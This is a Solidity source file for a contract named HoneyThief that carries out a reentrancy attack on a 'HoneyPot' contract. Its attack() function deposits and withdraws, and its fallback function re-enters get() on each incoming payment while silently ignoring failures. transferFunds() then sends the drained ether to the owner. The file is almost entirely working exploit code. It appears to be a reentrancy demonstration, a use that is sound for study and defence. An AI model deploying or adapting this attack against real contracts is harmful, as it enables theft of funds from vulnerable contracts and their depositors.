pragma solidity ^0.5.0;

import '@openzeppelin/contracts/ownership/Ownable.sol';

contract HoneyThief is Ownable {

    event LogFallback(address indexed sender, uint indexed value, uint honeyThiefBalance, uint honeyPotBalance);

    constructor() public {
    }

    function() external payable {

        emit LogFallback(msg.sender, msg.value, address(this).balance, msg.sender.balance);
    
        (bool success, ) = msg.sender.call(abi.encodeWithSignature("get()", ""));

        if(!success) {
            //Eat the failure. Do not revert. 
        }
    }

    function put(HoneyPot honeyPotAddress) private {
        honeyPotAddress.put.value(msg.value)();
    }
    
    function get(HoneyPot honeyPotAddress) private {
        honeyPotAddress.get();
    }

    function attack(HoneyPot honeyPotAddress) public payable onlyOwner {
        put(honeyPotAddress);
        get(honeyPotAddress);

    }

    function transferFunds() public onlyOwner {
        (bool success, ) = msg.sender.call.value(address(this).balance)("");
        require(success, "Transfer failed.");
    }

}

contract HoneyPot {

    function put() public payable;

    function get() public;

    function balances(address) public view returns (uint);
}